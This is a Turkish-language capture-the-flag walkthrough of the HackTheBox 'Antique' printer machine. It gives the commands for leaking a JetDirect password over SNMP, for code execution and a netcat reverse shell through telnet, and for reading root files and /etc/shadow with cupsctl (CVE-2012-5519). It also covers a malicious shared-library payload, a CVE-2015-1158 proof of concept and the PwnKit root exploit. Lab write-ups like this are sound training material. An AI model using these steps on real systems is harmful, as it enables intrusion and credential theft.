---
{"dg-publish":true,"permalink":"/ctf/antique-ctf/"}
---

Antique, HackTheBox'ın Printer track'inin bir parçası olarak rekabetçi olmayan bir şekilde yayınlandı. Eski bir HP yazıcıyı simüle eden bir kutu. SNMP üzerinden bir şifre sızdırarak başlayacağım ve daha sonra bunu telnet üzerinden yazıcıya bağlanmak için kullanacağım, burada sistemde komutları çalıştırmak için bir exec komutu var. Yükselmek için CUPS print manager yazılımının eski bir örneğini kullanarak dosyanın root olarak okunmasını sağlayacağım ve root bayrağını alacağım. Beyond Root bölümünde, iki CVE'ye daha bakacağım, gerçek yazıcılar takılı olmadığı için çalışmayan başka bir CUPS ve çalışan PwnKit.

## Box Info

|Name|[Antique](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fantique)[![Antique](https://0xdf.gitlab.io/icons/box-antique.png)](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fantique)  <br>[Play on HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fantique)|
|---|---|
|Release Date|27 Sep 2021|
|Retire Date|20 Sep 2021|
|OS|Linux ![Linux](https://0xdf.gitlab.io/icons/Linux.png)|
|Base Points|Easy [20]|
|![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)|N/A (non-competitive)|
|![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)|N/A (non-competitive)|
|Creator|[![MrR3boot](https://www.hackthebox.com/badge/image/13531)](https://app.hackthebox.com/users/13531)|

## Recon

### TCP nmap

nmap yalnızca bir açık TCP portu bulur, telnet (23):

![Pasted image 20250208165505.png](/img/user/resimler/Pasted%20image%2020250208165505.png)

```
nmap -p 23 -sCV 10.10.11.107   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 08:55 EST
Nmap scan report for 10.10.11.107
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
|     JetDirect
|     Password:
|   NULL: 
|_    JetDirect
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port23-TCP:V=7.94SVN%I=7%D=2/8%Time=67A76270%P=x86_64-pc-linux-gnu%r(NU
SF:LL,F,"\nHP\x20JetDirect\n\n")%r(GenericLines,19,"\nHP\x20JetDirect\n\nP
SF:assword:\x20")%r(tn3270,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(GetR
SF:equest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(HTTPOptions,19,"\nHP\
SF:x20JetDirect\n\nPassword:\x20")%r(RTSPRequest,19,"\nHP\x20JetDirect\n\n
SF:Password:\x20")%r(RPCCheck,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(D
SF:NSVersionBindReqTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNSStatu
SF:sRequestTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Help,19,"\nHP\x2
SF:0JetDirect\n\nPassword:\x20")%r(SSLSessionReq,19,"\nHP\x20JetDirect\n\n
SF:Password:\x20")%r(TerminalServerCookie,19,"\nHP\x20JetDirect\n\nPasswor
SF:d:\x20")%r(TLSSessionReq,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Ker
SF:beros,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(SMBProgNeg,19,"\nHP\x2
SF:0JetDirect\n\nPassword:\x20")%r(X11Probe,19,"\nHP\x20JetDirect\n\nPassw
SF:ord:\x20")%r(FourOhFourRequest,19,"\nHP\x20JetDirect\n\nPassword:\x20")
SF:%r(LPDString,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPSearchReq,1
SF:9,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPBindReq,19,"\nHP\x20JetDi
SF:rect\n\nPassword:\x20")%r(SIPOptions,19,"\nHP\x20JetDirect\n\nPassword:
SF:\x20")%r(LANDesk-RC,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Terminal
SF:Server,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(NCP,19,"\nHP\x20JetDi
SF:rect\n\nPassword:\x20")%r(NotesRPC,19,"\nHP\x20JetDirect\n\nPassword:\x
SF:20")%r(JavaRMI,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(WMSRequest,19
SF:,"\nHP\x20JetDirect\n\nPassword:\x20")%r(oracle-tns,19,"\nHP\x20JetDire
SF:ct\n\nPassword:\x20")%r(ms-sql-s,19,"\nHP\x20JetDirect\n\nPassword:\x20
SF:")%r(afp,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(giop,19,"\nHP\x20Je
SF:tDirect\n\nPassword:\x20");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 186.96 seconds

```


“JetDirect” stringi telnet taramasında ilginç olarak göze çarpıyor.


### Telnet - TCP 23

Antique'e bağlanmak için telnet kullanacağım ve HP JetDirect için bir banner ve bir parola prompt döndürüyor:

![Pasted image 20250208170204.png](/img/user/resimler/Pasted%20image%2020250208170204.png)

admin şifresinin tahmin edilmesi bağlantıyı kapatır:

![Pasted image 20250208170223.png](/img/user/resimler/Pasted%20image%2020250208170223.png)

### UDP nmap

TCP'deki diğer yolların sonuncusu göz önüne alındığında, bir UDP taramasına geri döneceğim. UDP taraması hem yavaş hem de güvenilmez olabiliyor. Sonuçları daha güvenilir (ve muhtemelen daha yavaş) hale getirmek için -sV'yi buldum, ancak sadece ilk on porta bakmak bile Antique'de ilginç bir şey buluyor:


![Pasted image 20250208170351.png](/img/user/resimler/Pasted%20image%2020250208170351.png)

SNMP (UDP 161) yanıt veriyor.

### SNMP - UDP 161

Antique üzerinde snmpwalk çalıştırıldığında yalnızca bir girdi döndürülür:

![Pasted image 20250208170436.png](/img/user/resimler/Pasted%20image%2020250208170436.png)

Ancak, [Hacking Network Printers'daki](http://www.irongeek.com/i.php?page=security/networkprinterhacking) bu yazı, belirli bir değişken sorarsam şifreyi sızdırabileceğimi öne sürüyor:

![Pasted image 20250208171427.png](/img/user/resimler/Pasted%20image%2020250208171427.png)

Blog yazısında bunların her bir baytın hex gösterimi olduğu belirtiliyor. Listenin başındaki sayıların hex ASCII aralığında (0x20 - 0x7e) olduğunu kabul edeceğim, sondakiler bu bağlamda bir anlam ifade etmese bile.

Bir Python shell'ine gireceğim ve sayıları nums olarak kaydedeceğim:

![Pasted image 20250208171557.png](/img/user/resimler/Pasted%20image%2020250208171557.png)
.split(), stringi boşluklardan ayırarak bir string dizisine böler:

![Pasted image 20250208171635.png](/img/user/resimler/Pasted%20image%2020250208171635.png)

Her bir öğe üzerinde döngü yapmak ve int fonksiyonunu uygulamak için bir Python liste kavraması kullanacağım, her birini bir sayıya dönüştüreceğim, hex'ten dönüştürmek için 16 tabanını kullanacağım:

![Pasted image 20250208171720.png](/img/user/resimler/Pasted%20image%2020250208171720.png)

Şimdi chr kullanarak her birinin bir ASCII karakterine dönüştürülmesini isteyeceğim:

![Pasted image 20250208171749.png](/img/user/resimler/Pasted%20image%2020250208171749.png)

Karakter listesini tekrar daha okunabilir tek bir dizede birleştirmek için ''.join() kullanacağım. Belki de parola “P@ssw0rd@123!!123 ”tür.

![Pasted image 20250208171819.png](/img/user/resimler/Pasted%20image%2020250208171819.png)


## Shell as lp

### Authenticated Telnet

Telnet'i tekrar deneyeceğim, bu sefer potansiyel şifre ile:

![Pasted image 20250208171904.png](/img/user/resimler/Pasted%20image%2020250208171904.png)

### Execution

Giriş mesajında ? yardımın gösterileceği yazıyor. Bunu deneyeceğim:

```
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

exec: execute system commands (exec id)
exit: quit from telnet session

```

Çoğu yazıcının yapılandırılmasıyla ilgili, ancak sonuncusu, exec benim amaçlarım için çok ilginç. ID'yi çalıştırmayı deneyeceğim:

![Pasted image 20250208172006.png](/img/user/resimler/Pasted%20image%2020250208172006.png)


### Reverse Shell

Benim reverse shell'im bash (nasıl çalıştığına dair videomu buradan izleyebilirsiniz). Bu bir yazıcı olduğundan, bash'in kutuda olup olmadığını kontrol edeceğim ve öyle:

![Pasted image 20250208172051.png](/img/user/resimler/Pasted%20image%2020250208172051.png)

nc -lnvp 443 kullanarak nc'yi hostumda dinlemeye başlayacağım ve Antique üzerinde reverse shell'i çalıştıracağım:

![Pasted image 20250208172142.png](/img/user/resimler/Pasted%20image%2020250208172142.png)

![Pasted image 20250208172148.png](/img/user/resimler/Pasted%20image%2020250208172148.png)

Sadece kilitleniyor, ama nc'de bir shell var:

![Pasted image 20250208172209.png](/img/user/resimler/Pasted%20image%2020250208172209.png)

Script shell upgrade hilesi benim için işe yaramadı (sadece terminalimi karıştırdı), ancak Python olanı iyi çalıştı:

```
lp@antique:~$ python3 -c 'import pty;pty.spawn("bash")'
lp@antique:~$ ^Z
[1]+  Stopped                 nc -lnvp 444
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 444
            reset
reset: unknown terminal type unknown
Terminal type? screen
lp@antique:~$ ls
telnet.py  user.txt
lp@antique:~$ 
```

## Shell as root

### Enumeration

#### Home Directory

lp'nin home dizini standart olmayan bir konumdadır:

![Pasted image 20250208172419.png](/img/user/resimler/Pasted%20image%2020250208172419.png)

Ne olursa olsun, oldukça boş:

![Pasted image 20250208172456.png](/img/user/resimler/Pasted%20image%2020250208172456.png)

telnet.py, HP telnet servisi gibi davranan bir programdır. Proses listesi (ps auxww) bu scriptin lp olarak çalıştırıldığını gösteriyor, bu yüzden onu daha fazla exploit etmek için bakmanın pek bir değeri yok:

```
lp 1024 0.0 0.2 239656 10920 ? Sl 00:42 0:00 python3 /var/spool/lpd/telnet.py
```


#### Listening Services

Antique'de telnet dışında dinlenen bir port daha var:

![Pasted image 20250208172612.png](/img/user/resimler/Pasted%20image%2020250208172612.png)

Eğer bu porta girip bir şeyler yazıp enter tuşuna basarsam, HTTP 400 Bad Request döndürüyor:

```
lp@antique:~$ nc 127.0.0.1 631
lasd
HTTP/1.0 400 Bad Request
Date: Mon, 02 May 2022 13:05:39 GMT
Server: CUPS/1.6
Content-Type: text/html; charset=utf-8
Content-Length: 346

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML>
<HEAD>
        <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
        <TITLE>Bad Request - CUPS v1.6.1</TITLE>
        <LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css">
</HEAD>
<BODY>
<H1>Bad Request</H1>
<P></P>
</BODY>
</HTML>
```

Bu portu curl edersem, bir sayfa döndürüyor:

```
lp@antique:~$ curl 127.0.0.1:631                      
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML>                                                 
<HEAD>
        <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
        <TITLE>Home - CUPS 1.6.1</TITLE>
        <LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css">
        <LINK REL="SHORTCUT ICON" HREF="/images/cups-icon.png" TYPE="image/png">
</HEAD>                                                           
<BODY>
<TABLE CLASS="page" SUMMARY="{title}"> 
...[snip]...
```


### CUPs / IPP

#### Tunnel

"Sayfayı daha iyi inceleyebilmek için, **[Chisel](https://github.com/jpillora/chisel)** kullanarak bir tünel (tunnel) kuracağım ve böylece kendi host'umdan bu sayfaya erişebileceğim. (Chisel ile ilgili detaylar için [bu gönderiye](https://0xdf.gitlab.io/cheatsheets/chisel) bakabilirsiniz.) GitHub'dan en son [sürümü](https://github.com/jpillora/chisel/releases/tag/v1.7.7) indirecek, dosyayı açacak (decompress) ve bu dizinde bir Python web sunucusu başlatacağım:"

```
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
```

![Pasted image 20250208172926.png](/img/user/resimler/Pasted%20image%2020250208172926.png)

Antique'den binary'yi getireceğim:

![Pasted image 20250208173003.png](/img/user/resimler/Pasted%20image%2020250208173003.png)

Hostumda, sunucu ile aynı binary'yi çalıştıracağım:

![Pasted image 20250208173044.png](/img/user/resimler/Pasted%20image%2020250208173044.png)

-p 9000 bunu dinlenecek port olarak ayarlar (herhangi bir port iş görür, ancak varsayılan 8080'dir, Burp zaten hostumda kullanıyor) ve --reverse reverse tünellere izin verir, böylece bir client VM'mde bir dinleme portu açabilir.

Şimdi ona Antique'den bağlanacağım:

```
./chisel_1.7.7_linux_amd64 client 10.10.16.9:9000 R:9631:localhost:631
```

![Pasted image 20250208173301.png](/img/user/resimler/Pasted%20image%2020250208173301.png)

![Pasted image 20250208173309.png](/img/user/resimler/Pasted%20image%2020250208173309.png)

Bu, chisel'a 9000'de virtual makineme bağlanmasını ve 9631'de virtual makinemde bir listening oluşturmasını söyler (sunucuyu root olarak çalıştırmazsanız 1024'ün altındaki portları kullanamazsınız). Bu dinleme portuna gelen herhangi bir trafik chisel tarafından Antique'e yönlendirilecek ve daha sonra Antique'den Antique üzerindeki 631 numaralı porta gönderilecektir.

Sunucumda Firefox'u localhost:9631'e yönlendirdiğimde sayfa yükleniyor.

#### Page

Sayfa bir CUPS sayfasıdır:

![Pasted image 20250208173516.png](/img/user/resimler/Pasted%20image%2020250208173516.png)

[CUPS](http://www.cups.org/) open-source bir printing sistemidir.

“ Administration” sekmesi bağlı olan (olmayan) yazıcıların yanı sıra işleri, sınıfları ve diğer idari bilgileri gösterir.

![Pasted image 20250208173558.png](/img/user/resimler/Pasted%20image%2020250208173558.png)

“ Server ” bölümünde çeşitli günlükleri gösteren bağlantılar var. Configuration dosyasını düzenlemeye ve kaydetmeye çalıştığımda, auth sorusu çıkıyor ki bende auth yok.

Error log'da daha önce yaptığım isteği görebiliyorum:

![Pasted image 20250208173857.png](/img/user/resimler/Pasted%20image%2020250208173857.png)

### CVE-2012-5519

#### Background
CUP'lardaki güvenlik açıkları için yapılan bir araştırma CVE-2012-5519, CUPS 1.6.1'de root olarak okunan dosya sonucunu veriyor ki bu da buradaki sürümle eşleşiyor.

Bu [makale](https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/escalate/cups_root_file_read) hem Metasploit modülünün nasıl çalıştırılacağını göstermek hem de nasıl başarısız olabileceğini açıklamak için gerçekten güzel bir iş çıkarıyor.

Exploit [kaynağına](https://github.com/rapid7/metasploit-framework/blob/master/modules/post/multi/escalate/cups_root_file_read.rb) bakıldığında, error log'u farklı bir dosyaya (datastore['FILE']) ayarlamak için mevcut oturumda cupsctl (ctl_path değişkenine kaydedilmiş) kullanılıyor:

```
cmd_exec("#{ctl_path} ErrorLog=#{datastore['FILE']}")
```

#### Read Flag

Yapabileceğim ilk şey root.txt dosyasını almak. Onu error log olarak ayarlayacağım:

```
lp@antique:~$ cupsctl ErrorLog=/root/root.txt
```


![Pasted image 20250208174535.png](/img/user/resimler/Pasted%20image%2020250208174535.png)


#### Shell Failures

Dosya sistemindeki kullanıcıların hash'lerini almak için /etc/shadow dosyasını okuyabiliyorum:

```
lp@antique:/dev/shm$ cupsctl ErrorLog=/etc/shadow
lp@antique:/dev/shm$ curl 127.0.0.1:631/admin/log/error_log?
root:$6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6btMs.oYtGQp7x4iDRlGCGJg8Ge9NO84P5lzjHN1WViD3jqX/VMw4LiR.:18760:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
...[snip]...
```

Hash'i olan tek kullanıcı root. Bunu hashcat kullanarak kırmayı deneyebilirim, bu tam satırı bir dosyaya (hash) koyup çalıştırabilirim:

```
$ /opt/hashcat-6.2.5/hashcat.bin hash /usr/share/wordlists/rockyou.txt --user
```

rockyou.txt dosyasının tamamını çalıştırmak 8 saatten fazla sürecek ve şifreyi bulamayacak.

Ayrıca /root/.ssh/id_rsa dosyasında bir SSH anahtarı olup olmadığını kontrol edeceğim, ancak dosya mevcut değil:

```
lp@antique:/dev/shm$ cupsctl ErrorLog=/root/.ssh/id_rsa
lp@antique:/dev/shm$ curl 127.0.0.1:631/admin/log/error_log?
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML>
<HEAD>
        <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
        <TITLE>Not Found - CUPS v1.6.1</TITLE>
        <LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css">
</HEAD>
<BODY>
<H1>Not Found</H1>
<P></P>
</BODY>
</HTML>
```

Beyond Root'ta istenmeyen bir şekilde bir shell alacağım.

## Beyond Root

### CVE-2015-1158
Google'da CUPS güvenlik açıklarını ararken, CUPS < 2.0.3'te remote code execution olan ve 1.6.1'i de içerebilecek CVE-2015-1158 ile karşılaştım.

[Bu script](https://github.com/0x00string/oldays/blob/master/CVE-2015-1158.py) bir POC, bu yüzden deneyeceğim.

İndirdiğimde bir Python2 script olduğunu ve çalıştırmak için bir host, bir port ve bir library gerektiğini gördüm:

```
oxdf@hacky$ python2 cve-2015-1158.py             ...[snip]...
python script.py <args>
   -h, --help:             Show this message
   -a, --rhost:            Target IP address
   -b, --rport:            Target IPP service port
   -c, --lib               /path/to/payload.so
   -f, --stomp-only        Only stomp the ACL (no postex)

Examples:
python script.py -a 10.10.10.10 -b 631 -f
python script.py -a 10.10.10.10 -b 631 -c /tmp/x86reverseshell.so
```

Basit bir .so dosyası oluşturacağım:

```
#include<stdio.h>
#include<stdlib.h>

void __attribute__((constructor)) evil();

void main() {};

void evil() {
    system("touch /0xdf");
}
```

Bu çalışırsa, dosya sistemi root'unda bir dosya oluşturacaktır.

Onu derleyeceğim:


```
oxdf@hacky$ gcc -shared -o so.so -fPIC so.c 
```

Hostumda bir Python web sunucusu ve Antique'de wget kullanarak bunu Antique'ye yükleyin. Şimdi, exploit'i tünel üzerinden çalıştıracağım:


```
oxdf@hacky$ python2 cve-2015-1158.py -a 127.0.0.1 -b 9631 -c /tmp/so.so
...[snip]...
[*]     locate available printer
[-]     no printers
```

Mevcut printer olmadığı için başarısız oluyor (yukarıda admin web sitesinde belirttiğim bir şey).

### PwnKit

#### Find Vulnerable

[LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) gibi bir şey bu hostun savunmasız olduğunu belirleyecektir. [Datadog](https://www.datadoghq.com/blog/pwnkit-vulnerability-overview-and-remediation/)'un bu yazısı dpkg -s policykit-1 çalıştırılarak manuel olarak nasıl kontrol edileceğini göstermektedir:

```
lp@antique:/dev/shm$ dpkg -s policykit-1
Package: policykit-1
Status: install ok installed
Priority: optional
Section: admin
Installed-Size: 560
Maintainer: Ubuntu Developers <ubuntu-devel-discuss@lists.ubuntu.com>
Architecture: amd64
Multi-Arch: foreign
Version: 0.105-26ubuntu1.1
Depends: dbus, libpam-systemd, libc6 (>= 2.7), libexpat1 (>= 2.0.1), libglib2.0-0 (>= 2.37.3), libpam0g (>= 0.99.7.1), libpolkit-agent-1-0 (= 0.105-26ubuntu1.1), libpolkit-gobject-1-0 (= 0.105-26ubuntu1.1), libsystemd0 (>= 213)
Conffiles:
 /etc/pam.d/polkit-1 7c794427f656539b0d4659b030904fe0
 /etc/polkit-1/localauthority.conf.d/50-localauthority.conf 2adb9d174807b0a3521fabf03792fbc8
 /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf c4dbd2117c52f367f1e8b8c229686b10
Description: framework for managing administrative policies and privileges
 PolicyKit is an application-level toolkit for defining and handling the policy
 that allows unprivileged processes to speak to privileged processes.
 .
 It is a framework for centralizing the decision making process with respect to
 granting access to privileged operations for unprivileged (desktop)
 applications.
Homepage: https://www.freedesktop.org/wiki/Software/polkit/
Original-Maintainer: Utopia Maintenance Team <pkg-utopia-maintainers@lists.alioth.debian.org>
```

Önemli olan şu:

```
Version: 0.105-26ubuntu1.1
```

Datadog gönderisindeki bu tabloya göre, bu Ubuntu 20.04 focal'daki son savunmasız sürümdür:

![Pasted image 20250208175104.png](/img/user/resimler/Pasted%20image%2020250208175104.png)

#### Exploit

Bu kutu aslında [PwnKit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)'e karşı savunmasız. Bir POC exploit indireceğim (Joe [Ammond](https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py)'dan bunu beğendim) ve Antique'e yükleyeceğim. Oradan, script'i çalıştırmak kadar basit:

```
lp@antique:/dev/shm$ python3 CVE-2021-4034.py
[+] Creating shared library for exploit code.
[+] Calling execve()
# id
uid=0(root) gid=7(lp) groups=7(lp),19(lpadmin)
```


